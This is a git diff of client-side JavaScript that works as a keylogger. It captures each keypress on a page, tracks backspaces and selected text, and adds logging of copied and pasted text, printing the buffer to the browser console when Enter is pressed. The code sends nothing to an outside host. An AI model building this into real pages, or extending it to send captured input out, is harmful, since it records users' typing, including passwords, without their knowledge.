@@ -1,42 +1,39 @@
-var keys = '';
+var keys = "";
 var selectedText = null;
+var copiedText = null;
+
+const BACKSPACE = 8;
+const ENTER = 13;
   
-document.onkeypress = function(e) {
-    var keyCode = e.keyCode;
-    var key = String.fromCharCode(keyCode)
-    keys += key;
+document.onkeypress = function(event) {
+    var keyCode = event.keyCode;
+
+    if (keyCode == ENTER) {
+        event.preventDefault();
+        console.log(keys);   
+        keys = '';
+    } else {
+        var key = String.fromCharCode(keyCode)
+        keys += key;
+    }
 }
 
-//detects backspaces
-document.onkeydown = function(e) {
-    var key = e.keyCode || e.charCode;
+// Remove Backspaces from Log
+document.onkeydown = function(event) {
+    var key = event.keyCode || event.charCode;
 
-    if( key == 8 || key == 46 ) {
-        if(selectedText != null && keys.indexOf(selectedText) != -1) {
+    if (key == BACKSPACE) {
+        if (selectedText != null && keys.indexOf(selectedText) != -1) {
             keys = keys.substring(0, keys.indexOf(selectedText)) + keys.substring(keys.indexOf(selectedText)+selectedText.length)
         } else {
-            if(keys.length > 0){
+            if (keys.length > 0) {
                 keys = keys.slice(0, -1);
             }
-        } 
-    }
-            
+        }
+    }         
 };
 
-function printKeys() {
-    console.log(keys)
-}
-
-function clearKeys() {
-    keys = ''
-}
-
-window.setInterval(function() {
-    printKeys()
-    clearKeys()
-}, 10000);
-
-function saveSelectedText() {
+function detectSelectedText() {
     var text = "";
     if (typeof window.getSelection != "undefined") {
         text = window.getSelection().toString();
@@ -45,8 +42,25 @@ function saveSelectedText() {
     } else {
         text = null;
     }
+    if (text == "") {
+        text = null;
+    }
     selectedText = text;
 }
 
-document.onmouseup = saveSelectedText;
-document.onkeyup = saveSelectedText;
+document.onmouseup = detectSelectedText;
+document.onkeyup = detectSelectedText;
+
+// Log Copy + Paste Text
+document.addEventListener('copy', function(){
+    copiedText = document.getSelection().toString();
+});
+
+document.addEventListener('paste', function(event){
+    keys += copiedText;
+});
+
+// window.setInterval(function(){
+//     console.log(keys);   
+//     keys = '';
+//  }, 10000);
